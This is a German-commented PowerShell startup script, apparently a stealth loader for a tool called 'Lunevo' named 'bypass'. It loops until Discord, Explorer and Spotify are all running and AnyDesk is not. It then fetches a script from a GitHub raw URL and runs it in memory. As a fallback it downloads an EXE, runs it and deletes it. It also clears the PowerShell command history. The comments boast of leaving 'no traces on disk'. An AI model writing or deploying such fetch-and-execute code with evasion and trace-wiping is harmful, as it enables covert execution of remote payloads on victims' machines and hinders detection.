# Lunevo Startup Chain
# Wird automatisch ausgeführt und wartet auf Discord UND Explorer UND Spotify
# Komplett fileless - keine Spuren auf Festplatte

# Debug-Logging
$logFile = "$env:TEMP\Lunevo\startup_chain.log"
try {
    $logDir = Split-Path -Parent $logFile
    if (-not (Test-Path $logDir)) {
        New-Item -ItemType Directory -Path $logDir -Force | Out-Null
    }
    "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] startup_chain.ps1 gestartet - Warte auf Discord + Explorer + Spotify" | Out-File -FilePath $logFile -Append -Encoding UTF8
} catch {}

# Endlosschleife - Prüft kontinuierlich
while ($true) {
    try {
        # Prüfe ob AnyDesk läuft (Blockade - kein Start wenn AnyDesk aktiv)
        $anydeskRunning = Get-Process -Name "anydesk" -ErrorAction SilentlyContinue
        if ($anydeskRunning) {
            try {
                "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] BLOCKADE: AnyDesk laeuft - Bypass wird NICHT gestartet" | Out-File -FilePath $logFile -Append -Encoding UTF8
            } catch {}
            Start-Sleep -Seconds 10
            continue
        }
        
        # Prüfe ob Discord UND Explorer UND Spotify laufen
        $discordRunning = Get-Process -Name "discord" -ErrorAction SilentlyContinue
        $explorerRunning = Get-Process -Name "explorer" -ErrorAction SilentlyContinue
        $spotifyRunning = Get-Process -Name "spotify" -ErrorAction SilentlyContinue
        
        try {
            "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Pruefung: Discord=$($discordRunning -ne $null), Explorer=$($explorerRunning -ne $null), Spotify=$($spotifyRunning -ne $null), AnyDesk=$($anydeskRunning -ne $null)" | Out-File -FilePath $logFile -Append -Encoding UTF8
        } catch {}
        
        if ($discordRunning -and $explorerRunning -and $spotifyRunning) {
            # Alle drei Prozesse laufen - Starte Bypass fileless
            
            try {
                "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Alle drei Prozesse laufen - Starte Bypass" | Out-File -FilePath $logFile -Append -Encoding UTF8
            } catch {}
            
            # Prüfe ob Bypass bereits läuft (verhindert mehrfaches Starten)
            $bypassRunning = Get-Process -Name "bypass" -ErrorAction SilentlyContinue
            if ($bypassRunning) {
                try {
                    "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Bypass laeuft bereits - Warte 60 Sekunden" | Out-File -FilePath $logFile -Append -Encoding UTF8
                } catch {}
                Start-Sleep -Seconds 60
                continue
            }
            
            # Erneute AnyDesk-Prüfung (vor jedem Start)
            $anydeskCheck = Get-Process -Name "anydesk" -ErrorAction SilentlyContinue
            if ($anydeskCheck) {
                try {
                    "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] BLOCKADE: AnyDesk erkannt - Bypass wird NICHT gestartet" | Out-File -FilePath $logFile -Append -Encoding UTF8
                } catch {}
                Start-Sleep -Seconds 30
                continue
            }
            
            # Lock-Datei prüfen (verhindert gleichzeitiges Starten)
            $lockFile = "$env:TEMP\Lunevo\bypass_lock.tmp"
            if (Test-Path $lockFile) {
                $lockTime = (Get-Item $lockFile).LastWriteTime
                $lockAge = (Get-Date) - $lockTime
                if ($lockAge.TotalSeconds -lt 120) {
                    try {
                        "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Lock-Datei vorhanden (vor $([int]$lockAge.TotalSeconds) Sekunden) - Warte" | Out-File -FilePath $logFile -Append -Encoding UTF8
                    } catch {}
                    Start-Sleep -Seconds 30
                    continue
                } else {
                    Remove-Item $lockFile -Force -ErrorAction SilentlyContinue
                }
            }
            
            # Erstelle Lock-Datei
            try {
                "LOCK" | Out-File -FilePath $lockFile -Force -ErrorAction SilentlyContinue
            } catch {}
            
            # Fileless Loader von GitHub laden und direkt ausführen
            $loaderUrl = "https://raw.githubusercontent.com/lunevo/lunevo/main/loader.ps1"
            try {
                try {
                    "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Lade loader.ps1 von GitHub..." | Out-File -FilePath $logFile -Append -Encoding UTF8
                } catch {}
                
                # Lade loader.ps1 direkt in Memory und führe aus (fileless)
                $loader = Invoke-WebRequest -Uri $loaderUrl -UseBasicParsing -ErrorAction Stop
                
                try {
                    "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] loader.ps1 geladen, fuehre aus..." | Out-File -FilePath $logFile -Append -Encoding UTF8
                } catch {}
                
                Invoke-Expression $loader.Content
                
                try {
                    "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] loader.ps1 ausgefuehrt" | Out-File -FilePath $logFile -Append -Encoding UTF8
                } catch {}
                
                # Warte 60 Sekunden bevor nächste Prüfung (verhindert mehrfaches Starten)
                Start-Sleep -Seconds 60
                
                # Lösche Lock-Datei nach erfolgreichem Start
                Start-Sleep -Seconds 5
                if (Test-Path $lockFile) {
                    Remove-Item $lockFile -Force -ErrorAction SilentlyContinue
                }
                
            } catch {
                try {
                    "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] FEHLER beim Laden von loader.ps1: $($_.Exception.Message)" | Out-File -FilePath $logFile -Append -Encoding UTF8
                } catch {}
                
                # Fallback: Direkter Download der EXE
                try {
                    $exeUrl = "https://raw.githubusercontent.com/lunevo/lunevo/main/bypass.exe"
                    $exeBytes = (Invoke-WebRequest -Uri $exeUrl -UseBasicParsing -ErrorAction Stop).Content
                    
                    $tempPath = "$env:TEMP\Lunevo\bypass_$(Get-Random).exe"
                    $exeDir = Split-Path -Parent $tempPath
                    if (-not (Test-Path $exeDir)) {
                        New-Item -ItemType Directory -Path $exeDir -Force | Out-Null
                    }
                    
                    if ($exeBytes -is [string]) {
                        $exeBytes = [System.Text.Encoding]::Default.GetBytes($exeBytes)
                    }
                    
                    [System.IO.File]::WriteAllBytes($tempPath, $exeBytes)
                    $proc = Start-Process -FilePath $tempPath -PassThru
                    
                    if ($proc) {
                        Start-Sleep -Milliseconds 200
                        Remove-Item -Path $tempPath -Force -ErrorAction SilentlyContinue
                    }
                    
                    Start-Sleep -Seconds 30
                } catch {
                    try {
                        "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] FEHLER beim Fallback: $($_.Exception.Message)" | Out-File -FilePath $logFile -Append -Encoding UTF8
                    } catch {}
                    Start-Sleep -Seconds 10
                }
            }
        } else {
            # Nicht alle drei Prozesse laufen - Warte 3 Sekunden und prüfe erneut
            Start-Sleep -Seconds 3
        }
    } catch {
        # Bei Fehler: Warte 5 Sekunden und versuche es erneut
        try {
            "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] FEHLER in Hauptschleife: $($_.Exception.Message)" | Out-File -FilePath $logFile -Append -Encoding UTF8
        } catch {}
        Start-Sleep -Seconds 5
    }
}

# Silent Log Cleaning (wird nie erreicht, aber für Vollständigkeit)
try {
    $historyPath = (Get-PSReadlineOption -ErrorAction SilentlyContinue).HistorySavePath
    if ($historyPath -and (Test-Path $historyPath)) {
        Clear-Content -Path $historyPath -Force -ErrorAction SilentlyContinue | Out-Null
    }
} catch {}
